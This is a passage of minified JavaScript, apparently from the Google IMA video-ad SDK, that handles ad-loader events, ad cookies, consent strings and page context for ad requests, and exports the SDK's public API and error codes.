                b = new Z(this.h, this.g, b.adTagUrl || "", b.adCuePoints, this.C, b.isCustomClickTrackingAllowed, mC(this.l, a));
                this.dispatchEvent(new gD(b, YD(this, a)));
                break;
            case "error":
                b = a.la;
                this.dispatchEvent(new DC(new BC(b), YD(this, a.Mb)));
                a = {
                    error: b.errorCode,
                    vis: ih(document)
                };
                eA().report(7, a);
                break;
            case "cookieUpdate":
                a = a.la;
                if (null == a) break;
                var c = a.gfpCookie;
                if (c && W.h) {
                    var d = new Sx;
                    Ee(d, 5, !0);
                    b = this.D;
                    c = xe(Dk, c ? JSON.parse(c) : null);
                    if (d) {
                        if (d) {
                            var e = {
                                    Ed: C(c, 2) - Date.now() / 1E3,
                                    path: C(c, 3),
                                    domain: C(c, 4),
                                    lf: !1
                                },
                                f = C(c, 1),
                                g = b.g;
                            Be(d, 5) && "null" !== g.origin && (new xs(g.document)).set("__gads", f, e)
                        }
                        Be(d, 5) && .01 > b.g.Math.random() && (d = mD(b, d), dg({
                            domain: C(c, 4),
                            host: b.g.location.host,
                            success: d === C(c, 1) ? "1" : "0"
                        }, "gfp_cw_status"))
                    }
                }
                ZD(this, a.encryptedSignalBidderIds || []);
                break;
            case "trackingUrlPinged":
                this.dispatchEvent(new FC(b, null, a.la))
        }
    };
    var ZD = function(a, b) {
            0 != b.length && (b = zz(b.map(function(c) {
                return {
                    Ea: c
                }
            }), a.o)) && b.forEach(function(c) {
                return c.then(function(d) {
                    d && (d = Wy(yz(a.o))) && (a.A.espSignals = d, $D(a))
                })
            })
        },
        $D = function(a) {
            Dy(mC(a.l), "adsLoader", "signalsRefresh", a.A)
        },
        YD = function(a, b) {
            var c = a.G.get(b);
            a.G.delete(b);
            return c
        },
        UD = function(a) {
            var b = a.adTagUrl;
            if (b) {
                var c = /iu=\/(\d+)\//.exec(Wc(b));
                (c = c && 2 == c.length ? c[1] : null) || (b = Zc((new P(b)).l.get("client")), c = jc(b) ? null : b);
                b = c
            } else b = null;
            b = b || "";
            var d = void 0 === d ? u : d;
            c = jD(b);
            if (0 != c) var e = c;
            else e = void 0 === e ? u : e, e = e.top, e = Uf(e, "googlefcInactive") ? 4 : b && Uf(e, "googlefcPA-" + b) ? 2 : Uf(e, "googlefcNPA") ? 3 : 0;
            b = d;
            d = b = void 0 === b ? u : b;
            d = void 0 === d ? u : d;
            (d = !!d.googlefc) || (d = b.top, d = void 0 === d ? u.top : d, d = Uf(d, "googlefcPresent"));
            var f = void 0 === f ? u : f;
            f = Uf(f.top, "googlefcLoaded");
            b = a.Vc;
            c = a.Zc;
            var g = {};
            return g.gfcPresent = d && 4 != e, g.gfcLoaded = f, g.gfcUserConsent = e, g.isGdprLoader = a.Dd, g.addtlConsent = b ? b.addtlConsent : null, g.gdprApplies = b ? b.gdprApplies : null, g.tcString = b ? b.tcString : null, g.uspString =
                c ? c.uspString : null, g
        },
        WD = function() {
            return new Promise(function(a) {
                xD(function() {
                    uD();
                    W.I = rD[1] || "";
                    uD();
                    W.X = rD[6] || "";
                    uD();
                    W.J = rD[4] || "";
                    a()
                })
            })
        },
        XD = function(a, b, c, d) {
            var e = {};
            e = (e.limaExperimentIds = Wh().sort().join(","), e);
            var f = a.getSettings(),
                g = 0 != W.g ? G(fr).l : a.h.A;
            g = void 0 === g ? null : g;
            var h = {};
            null != g && (h.activeViewPushUpdates = g);
            h.activityMonitorMode = f.g;
            h.adsToken = f.I;
            h.autoPlayAdBreaks = f.isAutoPlayAdBreaks();
            h.companionBackfill = f.getCompanionBackfill();
            h.cookiesEnabled = f.h;
            h.disableCustomPlaybackForIOS10Plus =
                f.getDisableCustomPlaybackForIOS10Plus();
            h.engagementDetection = !0;
            h.isFunctionalTest = !1;
            h.isVpaidAdapter = f.Fb();
            h["1pJar"] = f.J;
            h.numRedirects = f.getNumRedirects();
            h.pageCorrelator = f.R;
            h.persistentStateCorrelator = Qg();
            h.playerType = f.getPlayerType();
            h.playerVersion = f.getPlayerVersion();
            h.ppid = f.getPpid();
            h.privacyControls = f.X;
            h.reportMediaRequests = !1;
            h.sessionId = f.C;
            h.streamCorrelator = f.Y;
            h.testingConfig = Rx(f).g;
            h.urlSignals = f.aa;
            h.vpaidMode = f.getVpaidMode();
            h.featureFlags = f.getFeatureFlags();
            g = c.adTagUrl;
            f = {};
            f.contentMediaUrl = a.g.J;
            f.customClickTrackingProvided = null != a.g.C;
            a: {
                var k = Gk();k = q(k);
                for (var n = k.next(); !n.done; n = k.next())
                    if (n = n.value, n.url && n.url.includes("amp=1")) {
                        k = !0;
                        break a
                    }
                k = null != window.context ? 0 < parseInt(window.context.ampcontextVersion, 10) : null != Jk().l
            }
            f.isAmp = k;
            a: {
                try {
                    var m = window.top.location.href
                } catch (Hu) {
                    m = 2;
                    break a
                }
                m = null == m ? 2 : m == window.document.location.href ? 0 : 1
            }
            f.iframeState = m;
            f.imaHostingDomain = window.document.domain;
            f.imaHostingPageUrl = window.document.URL;
            if (Mm()) var v =
                window.location.href;
            else {
                n = Jk();
                m = n.h;
                k = n.g;
                var r = n.l;
                n = null;
                if (r)
                    if (r = r.url, Sh(Oi)) try {
                        v = ct(r);
                        var w = v.g,
                            x = Az(w, "/v/");
                        x || (x = Az(w, "/a/"));
                        if (!x) throw Error("Can not extract standalone amp url.");
                        var H = Az("/" + x, "/s/"),
                            ka = Ss(v.l);
                        ka.remove("amp_js_v");
                        ka.remove("amp_lite");
                        var Qa = H ? ct("https://" + H) : ct("http://" + x);
                        Rs(Qa, ka);
                        n = Qa.toString()
                    } catch (Hu) {
                        n = null
                    } else n = Bz(r);
                v = n ? n : m && m.url ? m.url : k && k.url ? k.url : ""
            }
            f.topAccessiblePageUrl = v;
            f.referrer = window.document.referrer;
            f.domLoadTime = a.l.J;
            f.sdkImplLoadTime =
                a.l.K;
            f.supportsResizing = !zC(a.g);
            v = E().location.ancestorOrigins;
            f.topOrigin = v ? 0 < v.length && 200 > v[v.length - 1].length ? v[v.length - 1] : "" : null;
            f.osdId = a.C;
            f.usesCustomVideoPlayback = zC(a.g);
            f.usesInlinePlayback = a.g.D;
            w = a.g.G;
            v = [];
            H = x = "";
            if (null != w) {
                x = w;
                H = !0;
                H = void 0 === H ? !1 : H;
                ka = [];
                for (Qa = 0; x && 25 > Qa; ++Qa) {
                    m = "";
                    void 0 !== H && H || (m = (m = 9 !== x.nodeType && x.id) ? "/" + m : "");
                    a: {
                        if (x && x.nodeName && x.parentElement) {
                            k = x.nodeName.toString().toLowerCase();
                            n = x.parentElement.childNodes;
                            for (var Ad = r = 0; Ad < n.length; ++Ad) {
                                var Sa =
                                    n[Ad];
                                if (Sa.nodeName && Sa.nodeName.toString().toLowerCase() === k) {
                                    if (x === Sa) {
                                        k = "." + r;
                                        break a
                                    }++r
                                }
                            }
                        }
                        k = ""
                    }
                    ka.push((x.nodeName && x.nodeName.toString().toLowerCase()) + m + k);
                    x = x.parentElement
                }
                x = ka.join();
                if (w) {
                    w = (w = w.ownerDocument) && (w.defaultView || w.parentWindow) || null;
                    H = [];
                    if (w) try {
                        var U = w.parent;
                        for (ka = 0; U && U !== w && 25 > ka; ++ka) {
                            var ad = U.frames;
                            for (Qa = 0; Qa < ad.length; ++Qa)
                                if (w === ad[Qa]) {
                                    H.push(Qa);
                                    break
                                }
                            w = U;
                            U = w.parent
                        }
                    } catch (Hu) {}
                    H = H.join()
                } else H = ""
            }
            v.push(x, H);
            if (null != g) {
                for (U = 0; U < vt.length - 1; ++U) v.push(Jf(g,
                    vt[U]) || "");
                U = Jf(g, "videoad_start_delay");
                ad = "";
                U && (U = parseInt(U, 10), ad = 0 > U ? "postroll" : 0 == U ? "preroll" : "midroll");
                v.push(ad)
            } else
                for (U = 0; U < vt.length; ++U) v.push("");
            U = v.join(":");
            ad = U.length;
            if (0 == ad) U = 0;
            else {
                g = 305419896;
                for (v = 0; v < ad; v++) g ^= (g << 5) + (g >> 2) + U.charCodeAt(v) & 4294967295;
                U = 0 < g ? g : 4294967296 + g
            }
            f = (f.videoAdKey = U.toString(), f);
            U = {};
            d = (U.consentSettings = d, U.imalibExperiments = e, U.settings = h, U.videoEnvironment = f, U);
            e = {};
            e.adsResponse = c.adsResponse;
            e.videoPlayActivation = c.videoPlayActivation;
            e.videoPlayMuted =
                c.videoPlayMuted;
            e.videoContinuousPlay = c.videoContinuousPlay;
            e.adTagUrl = c.adTagUrl;
            e.contentDuration = c.contentDuration;
            e.contentKeywords = c.contentKeywords;
            e.contentTitle = c.contentTitle;
            e.linearAdSlotWidth = c.linearAdSlotWidth;
            e.linearAdSlotHeight = c.linearAdSlotHeight;
            e.nonLinearAdSlotWidth = c.nonLinearAdSlotWidth;
            e.nonLinearAdSlotHeight = c.nonLinearAdSlotHeight;
            e.forceNonLinearFullSlot = c.forceNonLinearFullSlot;
            e.liveStreamPrefetchSeconds = c.liveStreamPrefetchSeconds;
            e.vastLoadTimeout = c.vastLoadTimeout;
            e.omidAccessModeRules = c.omidAccessModeRules;
            e.pageUrl = c.pageUrl;
            Object.assign(d, e);
            if (a.o && W.h) {
                e = a.o;
                c = new Sx;
                e = !fy(e);
                Ee(c, 5, e);
                e = a.D;
                if (0 === e.h) {
                    if (mD(e, c)) h = !0;
                    else if (h = e.g, Be(c, 5) && "null" !== h.origin && (new xs(h.document)).set("GoogleAdServingTest", "Good", void 0), h = "Good" === kD("GoogleAdServingTest", c, e.g)) f = e.g, Be(c, 5) && "null" !== f.origin && (new xs(f.document)).remove("GoogleAdServingTest", void 0, void 0);
                    e.h = h ? 2 : 1
                }
                d.isBrowserCookieEnabled = 2 === e.h;
                c = mD(a.D, c);
                null !== c && (d.gfpCookieValue = c)
            }
            d.trustTokenStatus =
                a.A.trustTokenStatus;
            if (c = Wy(yz(a.o))) a.A.espSignals = c, d.espSignals = c;
            d.isEapLoader = !1;
            b = mC(a.l, b);
            a.H.O(b, "adsLoader", a.M);
            Dy(b, "adsLoader", "requestAds", d)
        },
        RD = function(a) {
            QD(new KD(function(b) {
                a.A.trustTokenStatus = b;
                $D(a)
            }, null, !1))
        };
    SD.prototype.contentComplete = SD.prototype.contentComplete;
    SD.prototype.getSettings = SD.prototype.getSettings;
    SD.prototype.requestAds = SD.prototype.requestAds;
    SD.prototype.getVersion = SD.prototype.getVersion;
    SD.prototype.destroy = SD.prototype.destroy;
    y("google.ima.AdCuePoints", DB, window);
    y("google.ima.AdDisplayContainer", AC, window);
    y("google.ima.AdError.ErrorCode", {
        DEPRECATED_ERROR_CODE: -1,
        VAST_MALFORMED_RESPONSE: 100,
        VAST_SCHEMA_VALIDATION_ERROR: 101,
        VAST_UNSUPPORTED_VERSION: 102,
        VAST_TRAFFICKING_ERROR: 200,
        VAST_UNEXPECTED_LINEARITY: 201,
        VAST_UNEXPECTED_DURATION_ERROR: 202,
        VAST_WRAPPER_ERROR: 300,
        VAST_LOAD_TIMEOUT: 301,
        VAST_TOO_MANY_REDIRECTS: 302,
        VAST_NO_ADS_AFTER_WRAPPER: 303,
        VIDEO_PLAY_ERROR: 400,
        VAST_MEDIA_LOAD_TIMEOUT: 402,
        VAST_LINEAR_ASSET_MISMATCH: 403,
        VAST_PROBLEM_DISPLAYING_MEDIA_FILE: 405,
        OVERLAY_AD_PLAYING_FAILED: 500,
        NONLINEAR_DIMENSIONS_ERROR: 501,
        Jg: 502,
        kh: 503,
        Mf: 602,
        Hf: 603,
        UNKNOWN_ERROR: 900,
        VPAID_ERROR: 901,
        FAILED_TO_REQUEST_ADS: 1005,
        VAST_ASSET_NOT_FOUND: 1007,
        VAST_EMPTY_RESPONSE: 1009,
        UNKNOWN_AD_RESPONSE: 1010,
        UNSUPPORTED_LOCALE: 1011,
        ADS_REQUEST_NETWORK_ERROR: 1012,
        INVALID_AD_TAG: 1013,
        STREAM_INITIALIZATION_FAILED: 1020,
        ASSET_FALLBACK_FAILED: 1021,
        INVALID_ARGUMENTS: 1101,
        Cg: 1204,
        AUTOPLAY_DISALLOWED: 1205,
        CONSENT_MANAGEMENT_PROVIDER_NOT_READY: 1300,
        Zg: 2002
    }, window);
    y("google.ima.AdError.ErrorCode.VIDEO_ELEMENT_USED", -1, window);
    y("google.ima.AdError.ErrorCode.VIDEO_ELEMENT_REQUIRED", -1, window);
    y("google.ima.AdError.ErrorCode.VAST_MEDIA_ERROR", -1, window);
    y("google.ima.AdError.ErrorCode.ADSLOT_NOT_VISIBLE", -1, window);
    y("google.ima.AdError.ErrorCode.OVERLAY_AD_LOADING_FAILED", -1, window);
    y("google.ima.AdError.ErrorCode.VAST_MALFORMED_RESPONSE", -1, window);
    y("google.ima.AdError.ErrorCode.COMPANION_AD_LOADING_FAILED", -1, window);
    y("google.ima.AdError.Type", CC, window);
    y("google.ima.AdErrorEvent.Type", EC, window);
    y("google.ima.AdEvent.Type", GC, window);
    y("google.ima.AdsLoader", SD, window);
    y("google.ima.AdsManagerLoadedEvent.Type", hD, window);
    y("google.ima.CompanionAdSelectionSettings", qy, window);
    y("google.ima.CompanionAdSelectionSettings.CreativeType", ry, void 0);
    y("google.ima.CompanionAdSelectionSettings.ResourceType", sy, void 0);
    y("google.ima.CompanionAdSelectionSettings.SizeCriteria", ty, void 0);
    y("google.ima.CustomContentLoadedEvent.Type.CUSTOM_CONTENT_LOADED", "deprecated-event", window);
    y("ima.ImaSdkSettings", V, window);
    y("google.ima.settings", W, window);
    y("google.ima.ImaSdkSettings.CompanionBackfillMode", {
        ALWAYS: "always",
        ON_MASTER_AD: "on_master_ad"
    }, void 0);
    y("google.ima.ImaSdkSettings.VpaidMode", {
        DISABLED: 0,
        ENABLED: 1,
        INSECURE: 2
    }, void 0);
    y("google.ima.AdsRenderingSettings", yA, window);
    y("google.ima.AdsRenderingSettings.AUTO_SCALE", -1, window);
    y("google.ima.AdsRequest", iD, window);
    y("google.ima.VERSION", "3.479.1", void 0);
    y("google.ima.OmidAccessMode", {
        LIMITED: "limited",
        DOMAIN: "domain",
        FULL: "full"
    }, void 0);
    y("google.ima.UiElements", {
        AD_ATTRIBUTION: "adAttribution",
        COUNTDOWN: "countdown"
    }, void 0);
    y("google.ima.ViewMode", {
        NORMAL: "normal",
        FULLSCREEN: "fullscreen"
    }, void 0);
})();